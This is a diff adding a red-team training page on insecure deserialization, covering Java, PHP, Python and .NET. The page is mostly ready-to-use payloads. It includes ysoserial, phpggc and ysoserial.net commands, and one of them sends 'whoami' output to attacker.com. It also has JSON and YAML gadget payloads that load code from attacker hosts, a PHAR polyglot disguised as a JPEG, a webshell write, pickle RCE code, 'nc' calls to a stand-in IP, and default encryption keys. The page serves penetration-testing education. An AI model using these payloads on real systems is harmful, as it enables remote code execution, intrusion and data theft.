@@ -1,0 +1,294 @@
+---
+layout: training-page
+title: "Insecure Deserialization — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - deserialization
+  - rce
+  - java
+  - php
+  - python
+  - dotnet
+  - ysoserial
+  - gadget-chains
+page_key: "web-insecure-deserialization"
+---
+<h1>Insecure Deserialization</h1>
+<p>Serialization converts an object's state into a byte stream for storage or transmission. Deserialization reconstructs the original object from that byte stream. When applications deserialize user-controlled data without validation, attackers can craft malicious serialized objects that execute arbitrary code during the deserialization process — often leading to Remote Code Execution (RCE).</p>
+
+<h2>Identifying Serialized Data</h2>
+<p>The first step is recognizing which serialization format is in use. Each format has a distinctive magic byte sequence:</p>
+
+<table>
+  <tr><th>Format</th><th>Magic Bytes (Hex)</th><th>Base64 Prefix</th><th>Where Found</th></tr>
+  <tr><td>.NET ViewState</td><td><code>FF 01</code></td><td><code>/w</code></td><td>Hidden form inputs, <code>__VIEWSTATE</code> parameter</td></tr>
+  <tr><td>.NET BinaryFormatter</td><td><code>00 01 00 00 00 FF FF FF FF 01</code></td><td><code>AAEAAAD</code></td><td>Cookies, POST bodies</td></tr>
+  <tr><td>Java Serialized</td><td><code>AC ED</code></td><td><code>rO</code></td><td>Cookies, POST bodies, Java RMI</td></tr>
+  <tr><td>PHP Serialized</td><td><code>4F 3A</code></td><td><code>Tz</code></td><td>Cookies, session data — prefixes like <code>O:, a:, s:, i:, b:</code></td></tr>
+  <tr><td>Python Pickle</td><td><code>80 04 95</code></td><td><code>gASV</code></td><td>Cookies, API bodies — opcodes like <code>(lp0, S'Test'</code></td></tr>
+  <tr><td>Ruby Marshal</td><td><code>04 08</code></td><td><code>BAgK</code></td><td>Cookies, session data</td></tr>
+</table>
+
+<h2>POP Gadgets</h2>
+<p>A POP (Property-Oriented Programming) gadget is a piece of code in an application's existing codebase that is invoked during deserialization. Attackers chain gadgets together — one gadget's output becomes the next gadget's input — until the chain achieves code execution. Gadgets must be serializable, have accessible properties, and implement methods called during deserialization (<code>__wakeup</code>, <code>readObject</code>, <code>__destruct</code>, etc.).</p>
+
+<h2>Java Deserialization</h2>
+
+<h3>Detection</h3>
+<pre><code># Java serialized objects start with these bytes
+AC ED 00 05   (hex)
+rO0           (Base64 prefix)
+H4sIAAAAAAAAAJ (Base64 of gzip-compressed serialized object)
+
+# Content-Type header indicating Java serialization
+Content-Type: application/x-java-serialized-object</code></pre>
+
+<h3>ysoserial — Payload Generation</h3>
+<p>ysoserial generates exploit payloads for unsafe Java deserialization by leveraging gadget chains found in common Java libraries:</p>
+<pre><code># Generate payload using CommonsCollections1 gadget (requires commons-collections 3.1)
+java -jar ysoserial.jar CommonsCollections1 'id' &gt; payload.bin
+
+# Groovy gadget — execute command
+java -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin
+java -jar ysoserial.jar Groovy1 'ping 127.0.0.1' &gt; payload.bin
+
+# DNS-based detection — confirm deserialization without RCE risk
+java -jar ysoserial.jar URLDNS http://YOUR-INTERACTSH-URL &gt; detect.bin
+
+# Execute and pipe to target
+java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64 -w0</code></pre>
+
+<h3>ysoserial Gadget Chains (Selected)</h3>
+<pre><code>CommonsCollections1    commons-collections:3.1
+CommonsCollections6    commons-collections:3.1 (bypasses Java 8+ readObject restrictions)
+CommonsBeanutils1      commons-beanutils:1.9.2, commons-collections:3.1
+Spring1                spring-core:4.1.4, spring-beans:4.1.4
+Groovy1                groovy:2.3.9
+Jdk7u21                JDK 7u21 (no external deps required)
+URLDNS                 JDK only — DNS lookup for detection (no RCE)</code></pre>
+
+<h3>Burp Extensions for Java Deserialization</h3>
+<ul>
+  <li><strong>JavaSerialKiller</strong> — Burp extension for Java deserialization attacks — <code>github.com/NetSPI/JavaSerialKiller</code></li>
+  <li><strong>Java Deserialization Scanner</strong> — All-in-one detection and exploitation — <code>github.com/federicodotta/Java-Deserialization-Scanner</code></li>
+  <li><strong>burp-ysoserial</strong> — ysoserial integration with Burp — <code>github.com/summitt/burp-ysoserial</code></li>
+</ul>
+
+<h3>marshalsec — Alternative Payload Generator</h3>
+<pre><code>java -cp marshalsec.jar marshalsec.JsonIO Groovy "cmd" "/c" "calc"
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389</code></pre>
+
+<h3>Jackson JSON Deserialization</h3>
+<p>Jackson is a popular Java JSON library. With Polymorphic Type Handling enabled, attackers can specify arbitrary class types in JSON, triggering unsafe code execution when those classes are instantiated.</p>
+
+<p>Detect Jackson by sending invalid JSON and checking for the error class in the response:</p>
+<pre><code>com.fasterxml.jackson.databind.exc.MismatchedInputException</code></pre>
+
+<p>CVE-2019-12384 — JDBC URL injection via DriverManagerConnectionSource:</p>
+<pre><code>[
+  "ch.qos.logback.core.db.DriverManagerConnectionSource",
+  {
+    "url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker/inject.sql'"
+  }
+]</code></pre>
+
+<h3>SnakeYAML Deserialization (Java)</h3>
+<p>SnakeYAML can instantiate arbitrary Java classes when loading untrusted YAML:</p>
+<pre><code>!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker-ip/"]
+  ]]
+]</code></pre>
+
+<h2>PHP Deserialization (Object Injection)</h2>
+
+<h3>Key Magic Methods</h3>
+<p>PHP calls these methods automatically during serialization/deserialization — gadget chains exploit them:</p>
+<ul>
+  <li><code>__wakeup()</code> — called when object is unserialized</li>
+  <li><code>__destruct()</code> — called when object is garbage collected</li>
+  <li><code>__toString()</code> — called when object is used as a string</li>
+  <li><code>__construct()</code> — called when object is created</li>
+  <li><code>__call()</code> — called when invoking inaccessible methods</li>
+</ul>
+
+<h3>PHP Serialized Object Format</h3>
+<pre><code># Basic serialized data
+a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
+
+# Object with eval payload (PHPObjectInjection class with inject property)
+O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
+
+# Boolean type juggling bypass — true == "any string"
+a:2:{s:8:"username";b:1;s:8:"password";b:1;}
+
+# Object reference bypass for random value comparison
+O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}</code></pre>
+
+<h3>phpggc — PHP Gadget Chain Generator</h3>
+<p>phpggc generates PHP deserialization payloads for common frameworks:</p>
+<pre><code># Monolog RCE — execute phpinfo()
+phpggc monolog/rce1 'phpinfo();' -s
+
+# Monolog RCE — execute system command
+phpggc monolog/rce1 assert 'phpinfo()'
+
+# SwiftMailer — write webshell to disk
+phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
+
+# Monolog RCE as PHAR archive
+phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini</code></pre>
+
+<p>Supported frameworks: Laravel, Symfony, SwiftMailer, Monolog, SlimPHP, Doctrine, Guzzle.</p>
+
+<h3>PHAR Deserialization</h3>
+<p>PHAR (PHP Archive) files contain serialized metadata that is deserialized when the file is accessed via the <code>phar://</code> stream wrapper. If an application passes user-controlled filenames to file functions like <code>file_get_contents</code>, <code>file_exists</code>, or <code>fopen</code>, a PHAR payload can trigger deserialization:</p>
+<pre><code># If the application calls: file_get_contents($userInput)
+# Inject: phar://./uploads/evil.jpg
+
+# Create a PHAR with __destruct RCE payload
+&lt;?php
+class AnyClass {
+    public $data = null;
+    public function __construct($data) { $this-&gt;data = $data; }
+    function __destruct() { system($this-&gt;data); }
+}
+
+$phar = new Phar('evil.phar');
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString('test.txt', 'text');
+// Disguise as JPEG with JPEG magic bytes in the stub
+$phar-&gt;setStub("\xff\xd8\xff\n&lt;?php __HALT_COMPILER(); ?&gt;");
+$object = new AnyClass('whoami');
+$phar-&gt;setMetadata($object);
+$phar-&gt;stopBuffering();
+// Rename: mv evil.phar evil.jpg
+// Upload evil.jpg, then trigger: file_exists("phar://./uploads/evil.jpg")
+?&gt;</code></pre>
+
+<h2>Python Deserialization</h2>
+
+<h3>Vulnerable Sinks to Look For</h3>
+<pre><code>cPickle.loads(data)
+pickle.loads(data)
+_pickle.loads(data)
+jsonpickle.decode(data)</code></pre>
+
+<h3>Pickle RCE Payload</h3>
+<p>The <code>__reduce__</code> method controls what happens when an object is deserialized. An attacker can return a tuple of (callable, args) that executes arbitrary code:</p>
+<pre><code>import pickle
+import base64
+
+class RCE:
+    def __reduce__(self):
+        return eval, ("__import__('os').system('id')",)
+
+pickled = pickle.dumps(RCE())
+print(base64.b64encode(pickled).decode())
+# Submit the base64 output as the serialized cookie/token</code></pre>
+
+<h3>Python Pickle RCE Variants</h3>
+<pre><code>__import__('os').system('whoami')                              # Reflected RCE
+getattr('', __import__('os').popen('whoami').read())           # Error-Based RCE
+__import__("os").popen("id &amp;&amp; sleep 5").read()                  # Time-Based RCE</code></pre>
+
+<h3>PyYAML Deserialization RCE</h3>
+<p>PyYAML prior to version 6.0 (or when using unsafe loaders) can instantiate Python objects from YAML tags. Since 6.0, the default loader is SafeLoader — only <code>yaml.unsafe_load</code> and explicit <code>Loader=yaml.UnsafeLoader</code> are vulnerable:</p>
+<pre><code># Execute arbitrary OS command via PyYAML unsafe load
+!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
+!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
+!!python/object/new:subprocess [["ls","-ail"]]
+!!python/object/new:subprocess.check_output [["cat","/etc/passwd"]]
+
+# Subprocess Popen
+!!python/object/apply:subprocess.Popen
+- ls
+
+# Execute Python code
+!!python/object/new:str
+state: !!python/tuple
+- 'print(getattr(open("flag.txt"), "read")())'
+- !!python/object/new:Warning
+  state:
+    update: !!python/name:exec</code></pre>
+
+<h2>.NET Deserialization</h2>
+
+<h3>Detection</h3>
+<pre><code># .NET BinaryFormatter magic bytes (hex)
+00 01 00 00 00 FF FF FF FF 01
+
+# Base64 prefix
+AAEAAAD
+
+# .NET ViewState (Base64)
+/w  (short form)
+AAEAAD  (BinaryFormatter wrapped in ViewState)</code></pre>
+
+<h3>ysoserial.net — .NET Payload Generation</h3>
+<pre><code># JSON.NET with ObjectDataProvider gadget — execute calc.exe
+./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
+
+# BinaryFormatter with PSObject gadget
+./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
+
+# NetDataContractSerializer — TypeConfuseDelegate gadget
+./ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
+
+# LosFormatter (uses BinaryFormatter internally)
+./ysoserial.exe -f LosFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
+
+# DotNetNuke exploit — read arbitrary file
+./ysoserial.exe -p DotNetNuke -m read_file -f win.ini
+
+# Read long command from file
+cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s</code></pre>
+
+<h3>JSON.NET Payload Example</h3>
+<pre><code>{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['cmd', '/c calc.exe']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}</code></pre>
+
+<h3>.NET ViewState Deserialization</h3>
+<p>ViewState in ASP.NET stores page state in a hidden field. If not encrypted or signed (or using weak default keys), it can be tampered with to achieve RCE.</p>
+<pre><code># Check ViewState encoding
+# base64 starting with rO0 = Java serialized
+# base64 starting with /w  = .NET ViewState
+# base64 starting with H4sI = gzip+base64
+
+# Server-side vs client-side storage
+# Server side: value="-XXX:-XXXX" (just an ID reference)
+# Client side: base64 + gzip + serialized object
+
+# Apache MyFaces default encryption keys (try these if no custom key)
+AES CBC/PKCS5Padding: NzY1NDMyMTA3NjU0MzIxMA==
+DES:                  NzY1NDMyMTA=</code></pre>
+
+<h2>General Testing Methodology</h2>
+<ol>
+  <li>Identify serialized data in cookies, POST bodies, hidden fields, and API parameters</li>
+  <li>Decode (base64/hex) and check magic bytes to identify the serialization format</li>
+  <li>Use the URLDNS/DNS gadget with ysoserial first — safe detection without triggering RCE</li>
+  <li>If DNS callback is received, confirm the library/gadget chain version by testing progressively</li>
+  <li>Generate an RCE payload targeting the confirmed gadget chain</li>
+  <li>For blind exploitation, use time-based commands (<code>sleep 5</code>) to confirm execution</li>
+</ol>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings — Insecure Deserialization — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+  <li>ysoserial — Java deserialization payload generator — <code>github.com/frohoff/ysoserial</code></li>
+  <li>ysoserial.net — .NET deserialization payload generator — <code>github.com/pwntester/ysoserial.net</code></li>
+  <li>phpggc — PHP gadget chain generator — <code>github.com/ambionics/phpggc</code></li>
+  <li>Java Deserialization Cheat Sheet — GrrrDog — <code>github.com/GrrrDog/Java-Deserialization-Cheat-Sheet</code></li>
+  <li>marshalsec — Java unmarshaller security — <code>github.com/mbechler/marshalsec</code></li>
+  <li>PortSwigger Deserialization Web Security Academy — <code>portswigger.net/web-security/deserialization</code></li>
+  <li>Exploiting Deserialization in ASP.NET via ViewState — Soroush Dalili — <code>soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate</code></li>
+  <li>DeserLab — Java deserialization practice lab — <code>github.com/NickstaDB/DeserLab</code></li>
+</ul>
